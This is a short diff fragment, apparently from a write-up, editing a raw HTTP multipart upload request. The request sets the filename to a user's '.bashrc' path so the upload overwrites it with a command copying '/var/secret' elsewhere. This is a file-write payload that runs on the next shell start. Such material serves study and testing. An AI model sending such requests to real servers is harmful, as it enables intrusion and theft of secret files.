@@ -40,7 +40,7 @@ Connection: close
 -----------------------------158661620315800
 Content-Disposition: form-data; name="file"; filename="/home/manhndd/.bashrc"
 Content-Type: text/html
-cp /var/secret | /opt/dogs
+cp /var/secret /opt/dogs
 
 -----------------------------158661620315800
 ```
